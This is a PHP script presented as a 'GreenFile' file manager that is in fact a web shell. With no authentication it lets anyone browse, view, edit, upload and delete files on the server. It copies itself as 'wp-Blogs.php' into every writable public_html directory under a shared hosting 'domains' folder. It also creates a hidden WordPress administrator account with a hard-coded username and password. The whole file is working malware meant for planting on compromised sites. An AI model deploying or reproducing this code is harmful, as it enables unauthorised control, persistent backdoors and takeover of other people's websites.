<?php 
// 🟢 GreenFile — PHP File Manager & Auto-Replicator 🔄 
// NOTE: This script can copy itself to other folders as wp-Blogs.php 
error_reporting(0);  

// === Path Handling — Current directory location ===
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd(); 
if (!$path || !is_dir($path)) $path = getcwd();  

// === Handle Delete — Remove files/folders ===
if (isset($_GET['delete'])) {     
    $target = realpath($_GET['delete']);     
    if ($target && strpos($target, getcwd()) === 0 && file_exists($target)) {         
        if (is_dir($target)) rmdir($target);         
        else unlink($target);         
        echo "<p style='color:#00FF00;'>🗑️ Deleted: " . htmlspecialchars(basename($target)) . " — Item removed.</p>";     
    } 
}  

// === Breadcrumb UI — Navigation path ===
function breadcrumb($path) {     
    $parts = explode('/', trim($path, '/'));     
    $built = '/';     
    $html = "<strong>Current path:</strong> ";     
    foreach ($parts as $part) {         
        $built .= "$part/";         
        $html .= "<a href='?path=" . urlencode($built) . "'>$part</a>/";     
    }     
    return $html; 
}  

// === Folder/File Listing — Directory contents ===
function list_dir($path) {     
    $out = '';     
    $folders = $files = [];     
    foreach (scandir($path) as $item) {         
        if ($item === '.' || $item === '..') continue;         
        $full = "$path/$item";         
        if (is_dir($full)) $folders[] = $item;         
        else $files[] = $item;     
    }     
    natcasesort($folders);     
    natcasesort($files);      

    // Display folders first
    foreach ($folders as $f) {         
        $full = "$path/$f";         
        $out .= "<li>📁 <a href='?path=" . urlencode($full) . "'>$f</a> | <a href='?delete=" . urlencode($full) . "' onclick=\"return confirm('Delete this folder?')\" style='color:#00FF00;'>🗑️ Delete</a></li>";     
    }     

    // Then files
    foreach ($files as $f) {         
        $full = "$path/$f";         
        $out .= "<li>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($f) . "'>$f</a> | <a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "' style='color:#66FF66'>✏️ Edit</a> | <a href='?delete=" . urlencode($full) . "' onclick=\"return confirm('Delete this file?')\" style='color:#00FF00;'>🗑️ Delete</a></li>";     
    }     
    return $out; 
}  

// === View File — Display file contents ===
function view_file($path, $file) {     
    $full = "$path/$file";     
    if (!is_file($full)) return;     
    echo "<h3>📄 Viewing: $file</h3><pre style='background:#222;padding:10px;color:#00FF00;border:1px solid #444;'>";     
    echo htmlspecialchars(file_get_contents($full));     
    echo "</pre><hr>"; 
}  

// === Edit File — Modify file content ✒️ ===
function edit_file($path, $file) {     
    $full = "$path/$file";     
    if (!is_file($full)) return;     
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {         
        file_put_contents($full, $_POST['content']);         
        echo "<p style='color:#00FF00;'>✅ Saved — Changes applied.</p>";     
    }     
    $code = htmlspecialchars(file_get_contents($full));     
    echo "<h3>✏️ Editing: $file</h3> <form method='post'> <textarea name='content' rows='20' style='width:100%;background:#222;color:#00FF00;'>$code</textarea><br> <button style='background:#00FF00;'>Save</button> </form><hr>"; 
}  

// === Upload + Folder + File Creation — Add new items 🛠️ ===
function upload_mkdir_create($path) {     
    if (!empty($_FILES['up']['name'])) {         
        move_uploaded_file($_FILES['up']['tmp_name'], "$path/" . basename($_FILES['up']['name']));         
        echo "<p style='color:#00FF00;'>📤 Uploaded — File received.</p>";     
    }     
    if (!empty($_POST['mkdir'])) {         
        $target = "$path/" . basename($_POST['mkdir']);         
        if (!file_exists($target)) {             
            mkdir($target);             
            echo "<p style='color:#00FF00;'>📁 Folder created — New directory added.</p>";         
        } else {             
            echo "<p style='color:#00FF00;'>❌ Folder exists — Already present.</p>";         
        }     
    }     
    if (!empty($_POST['newfile']) && !empty($_POST['filename'])) {         
        $filename = basename($_POST['filename']);         
        $target = "$path/$filename";         
        if (!file_exists($target)) {             
            file_put_contents($target, $_POST['newfile']);             
            echo "<p style='color:#00FF00;'>📄 File created — New file written.</p>";         
        } else {             
            echo "<p style='color:#00FF00;'>❌ File exists — Name already used.</p>";         
        }     
    }      

    // Forms for file/folder upload/creation
    echo "<form method='post' enctype='multipart/form-data'>         
            <input type='file' name='up'>         
            <button style='background:#00FF00;'>Upload</button>     
        </form><br>     
        <form method='post'>         
            📁 <input type='text' name='mkdir' placeholder='Folder name'>         
            <button style='background:#00FF00;'>Create Folder</button>     
        </form><br>     
        <form method='post'>         
            📄 <input type='text' name='filename' placeholder='File name'><br>         
            <textarea name='newfile' rows='5' style='width:100%;background:#222;color:#00FF00;' placeholder='File content'></textarea>         
            <button style='background:#00FF00;'>Create File</button>     
        </form><br>"; 
}  

// === Self-replication — Copy script to other locations 🔄 ===
function replicate_self($code) {     
    static $done = false;     
    if ($done) return [];     
    $done = true;     
    $dir = __DIR__;     
    $cloned_urls = [];     
    while ($dir !== '/') {         
        if (is_dir("$dir/domains")) {             
            foreach (scandir("$dir/domains") as $d) {                 
                if ($d === '.' || $d === '..') continue;                 
                $targetDir = "$dir/domains/$d/public_html";                 
                $targetFile = "$targetDir/wp-Blogs.php";                 
                if (is_dir($targetDir) && is_writable($targetDir)) {                     
                    if (file_put_contents($targetFile, $code)) {                         
                        $cloned_urls[] = "http://$d/wp-Blogs.php";                     
                    }                 
                }             
            }             
            break;         
        }         
        $dir = dirname($dir);     
    }     
    return $cloned_urls; 
}  

// === WP Admin — Create WordPress administrator ⚡ ===
function handle_wp_injection($path) {     
    if (!isset($_GET['create_wp_user'])) return;     
    $wp = $path;     
    while ($wp !== '/') {         
        if (file_exists("$wp/wp-config.php")) break;         
        $wp = dirname($wp);     
    }     
    if (!file_exists("$wp/wp-load.php")) {         
        echo "<p style='color:#00FF00;'>❌ WordPress not found — No WP installation detected.</p>";         
        return;     
    }     
    require_once("$wp/wp-load.php");     
    $user = 'savvy';     
    $pass = 'SavvyMrx#';     
    $mail = 'savvy@domain.com';     
    if (!username_exists($user) && !email_exists($mail)) {         
        $uid = wp_create_user($user, $pass, $mail);         
        $wp_user = new WP_User($uid);         
        $wp_user->set_role('administrator');         
        echo "<p style='color:#00FF00;'>✅ WP Admin user 'savvy' created — Administrator added.</p>";     
    } else {         
        echo "<p style='color:#00FF00;'>⚠️ User/email already exists — Cannot create duplicate.</p>";     
    } 
}  

// === Render HTML — Main interface 📜 ===
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>🟢 GreenFile</title> 
<style> body { background:#1a1a1a; color:#bbb; font-family:monospace; padding:20px; max-width:900px; margin:auto; } 
a { color:#00FF00; text-decoration:none; } 
a:hover { text-decoration:underline; color:#33FF33; } 
pre, textarea { width:100%; background:#222; color:#00FF00; border:1px solid #444; } 
button { background:#00FF00; border:none; color:#000; padding:6px 12px; margin-top:5px; cursor:pointer; } 
ul { list-style:none; padding:0; } 
input[type='text'] { background:#222; color:#00FF00; border:1px solid #444; padding:5px; } 
</style></head><body> 
<h2>🟢 GreenFile — File Browser</h2> 
<p>" . breadcrumb($path) . "</p><hr>";  

// WP Admin Button
echo "<form method='get'> 
<input type='hidden' name='path' value='" . htmlspecialchars($path) . "'> 
<button name='create_wp_user' value='1'>👤 Create WP Admin</button> 
</form><br>";  

handle_wp_injection($path);  

// Go up — Navigate to parent directory
$up = dirname($path); 
if ($up && $up !== $path) echo "<p>⬆️ <a href='?path=" . urlencode($up) . "'>Go up: $up</a></p>";  

// View/Edit if requested
if (isset($_GET['view'])) view_file($path, basename($_GET['view'])); 
if (isset($_GET['edit'])) edit_file($path, basename($_GET['edit']));  

// Upload/Folder/File UI
upload_mkdir_create($path);  

// Auto-replication — Only from original, not clones
if (basename(__FILE__) !== 'wp-Blogs.php') {     
    $clones = replicate_self(file_get_contents(__FILE__));     
    if (!empty($clones)) {         
        echo "<p style='color:#00FF00;'>✅ Auto-replicated to:</p><ul>";         
        foreach ($clones as $u) echo "<li><a href='$u' target='_blank'>$u</a></li>";         
        echo "</ul><hr>";     
    } 
}  

// Directory listing
echo "<ul>" . list_dir($path) . "</ul>"; 
echo "</body></html>"; 
?>